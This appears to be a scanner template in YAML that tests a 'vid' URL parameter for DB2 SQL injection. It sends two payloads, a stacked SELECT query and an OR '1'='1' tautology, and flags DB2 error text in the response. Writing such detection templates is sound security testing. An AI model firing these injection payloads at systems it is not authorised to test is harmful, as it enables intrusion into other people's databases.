id: sqli3-db2-08
name: 'SQLi db2 prefix #7 in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - '1''; SELECT 1--'
        - '1'' OR ''1''=''1'' /*'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
